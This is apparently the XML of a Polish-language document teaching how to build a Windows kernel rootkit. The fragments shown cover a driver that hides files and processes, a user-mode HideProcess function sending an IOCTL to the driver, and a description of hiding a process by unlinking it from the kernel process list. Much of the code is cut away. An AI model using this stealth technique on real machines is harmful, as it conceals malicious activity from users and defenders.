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text-properties fo:color="#000000" style:font-name="Times New Roman" fo:font-size="12pt" style:font-name-asian="Courier" style:font-size-asian="12pt" style:font-name-complex="Courier" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="P43" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L4">
      <style:text-properties fo:color="#000000" style:font-name="Courier" fo:font-size="12pt" style:font-name-asian="Courier" style:font-size-asian="12pt" style:font-name-complex="Courier" style:font-size-complex="12pt"/>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zliwia ona ogladanie informacji debugowych wyswietlanych przez rootkita. Wiadomo co sie w danej chwili dzieje.</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">Wazne: <text:s/>proces o nazwie rozpoczynajacej sie od „master”bedzie widzial ukryte pliki i tylko ten proces moze wyladowac rootkita.( jak uruchomisz ponownie tez go nie bedzie w pamieci bo laduje sie tylko na czas uruchomienia systemu).</text:p>
      <text:p text:style-name="P3">Najlepiej skopiuj z katalogu Windowsa plik cmd.exe (gdzies tam jest) i zmien mu nazwe na „master.exe”. <text:s/>Po zaladowaniu rootkita ukryje on wszystkie pliki zaczynajace sie od slowa rootkit.</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">zal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ladowany rootkit dziala tylko na czas tego uruchomienia systemu. Po reboocie napewno nie bedzie go w pamie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sc bajtow które zostaly przyslane w tym pakiecie IRP</text:p>
      <text:p text:style-name="P7"><text:tab/>inputSize = irpStack-&gt;Parameters.DeviceIoControl.InputBufferLength;</text:p>
      <text:p text:style-name="P8"><text:tab/>// wskaz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lo sie jedna podwojne slowo (zmienna typu DWORD)</text:span></text:p>
      <text:p text:style-name="P8"><text:tab/><text:tab/><text:tab/>// w sterownikach uzywa sie typu ULONG tego samego rozmiaru</text:p>
      <text:p text:style-name="P8"><text:tab/><text:tab/><text:tab/>// przetypowujemy wskaznik na wskaznik do ULONG i wyluskujemy spod tego </text:p>
      <text:p text:style-name="P8"><text:tab/><text:tab/><text:tab/>// wskaznika PID procesu , który zamierzamy ukryc</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luzeniu pakietu IRP trzeba zwrocic do systemu informacje czy operacja sie powiodla czy nie</text:p>
      <text:p text:style-name="P8"><text:tab/>// my zawsze zwracamy STATUS_SUCCESS (ustawiony na pocza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ada komunikacja od strony sterownika (kernel-mode).</text:p>
      <text:p text:style-name="P10">Od strony aplikacji wyglada to nastepujaco:</text:p>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P11"><text:span text:style-name="T3">bool</text:span><text:span text:style-name="T4"> HideProcess(DWORD pid)</text:span></text:p>
      <text:p text:style-name="P12">{</text:p>
      <text:p text:style-name="P12"><text:tab/>DWORD dwReturn;</text:p>
      <text:p text:style-name="P12"/>
      <text:p text:style-name="P12"><text:tab/>// otwarcie urzadzenia rootkita</text:p>
      <text:p text:style-name="P12"><text:tab/>hDevice = CreateFile(</text:p>
      <text:p text:style-name="P13"><text:tab/><text:tab/><text:tab/>"\\\\.\\rootkitDrv", </text:p>
      <text:p text:style-name="P13"><text:tab/><text:tab/><text:tab/>GENERIC_READ | GENERIC_WRITE,</text:p>
      <text:p text:style-name="P13"><text:tab/><text:tab/><text:tab/>FILE_SHARE_READ, NULL,</text:p>
      <text:p text:style-name="P13"><text:tab/><text:tab/><text:tab/>OPEN_EXISTING,</text:p>
      <text:p text:style-name="P13"><text:tab/><text:tab/><text:tab/>FILE_ATTRIBUTE_NORMAL,</text:p>
      <text:p text:style-name="P13"><text:tab/><text:tab/><text:tab/>NULL);</text:p>
      <text:p text:style-name="P13"/>
      <text:p text:style-name="P13"><text:span text:style-name="T4"><text:tab/></text:span><text:span text:style-name="T3">if</text:span><text:span text:style-name="T4"> ( !hDevice ) </text:span></text:p>
      <text:p text:style-name="P13"><text:span text:style-name="T4"><text:tab/><text:tab/></text:span><text:span text:style-name="T3">return</text:span><text:span text:style-name="T4"> </text:span><text:span text:style-name="T3">false</text:span><text:span text:style-name="T4">;</text:span></text:p>
      <text:p text:style-name="P12"/>
      <text:p text:style-name="P14"><text:tab/>// wyslanie pakietu IRP_MJ_DEVICE_CONTROL o kodzie IOCTL_HIDE_PROCESS,</text:p>
      <text:p text:style-name="P15"><text:span text:style-name="T4"><text:tab/>// kod ten jest utworzony przez specjalne makro </text:span>CTL_CODE<text:span text:style-name="T4"> po podaniu odpowiednich parametrow - </text:span></text:p>
      <text:p text:style-name="P14"><text:tab/>// takich samych w kodzie rootkita i aplikacji w user mode</text:p>
      <text:p text:style-name="P13"><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lamy zmienna pid</text:span></text:p>
      <text:p text:style-name="P13"><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znik</text:span></text:p>
      <text:p text:style-name="P12"><text:tab/><text:tab/><text:tab/>0, <text:tab/><text:tab/><text:tab/><text:span text:style-name="T5">// zero bajto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3"><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3"><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e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1"/>
      <text:list text:style-name="L4">
        <text:list-item>
          <text:list>
            <text:list-header>
              <text:p text:style-name="P38"/>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text:p>
              <text:p text:style-name="P38">Z tej listy korzystają wszystkie normalne mechanizmy listujące procesy w systemie Windows. Żeby więc ukryć proces wystarczy odłączyć proces z tej listy.</text:p>
              <text:p text:style-name="P38"/>
              <text:p text:style-name="P38">//TODO ciąg dalszy to komentarz do kodu który ukrywa proces przez odłączenie z tej listy, mogę zrobić jakąś grafikę jak będzie trzeba ;)</text:p>
              <text:p text:style-name="P38"/>
            </text:list-header>
          </text:list>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P42"><text:tab/></text:p>
      <text:p text:style-name="P42"/>
      <text:p text:style-name="P42"/>
      <text:p text:style-name="P42"/>
      <text:p text:style-name="P42"/>
      <text:p text:style-name="P42"/>
      <text:list text:style-name="L4">
        <text:list-item>
          <text:list>
            <text:list-header>
              <text:p text:style-name="P39"/>
            </text:list-header>
          </text:list>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P42"/>
      <text:p text:style-name="P42"><text:tab/><text:tab/></text:p>
      <text:p text:style-name="P42"><text:tab/></text:p>
      <text:p text:style-name="P42"/>
      <text:p text:style-name="P42"/>
      <text:p text:style-name="P42"><text:tab/></text:p>
      <text:list text:style-name="L4">
        <text:list-item>
          <text:list>
            <text:list-header>
              <text:p text:style-name="P43"/>
            </text:list-header>
          </text:list>
        </text:list-item>
      </text:list>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4">
        <text:list-item>
          <text:list>
            <text:list-item>
              <text:p text:style-name="P30"/>
            </text:list-item>
          </text:list>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P17"><text:tab/><text:tab/></text:p>
      <text:p text:style-name="Standard"><text:tab/></text:p>
      <text:p text:style-name="Standard"><text:tab/></text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"><text:tab/><text:tab/></text:p>
      <text:p text:style-name="Standard"/>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14T21:06:55</dc:date>
    <dc:language>pl-PL</dc:language>
    <meta:editing-cycles>11</meta:editing-cycles>
    <meta:editing-duration>PT4H30M52S</meta:editing-duration>
    <meta:user-defined meta:name="Info 1"/>
    <meta:user-defined meta:name="Info 2"/>
    <meta:user-defined meta:name="Info 3"/>
    <meta:user-defined meta:name="Info 4"/>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="9" meta:paragraph-count="346" meta:word-count="2048" meta:character-count="16992"/>
  </office:meta>
</office:document-meta>
</file>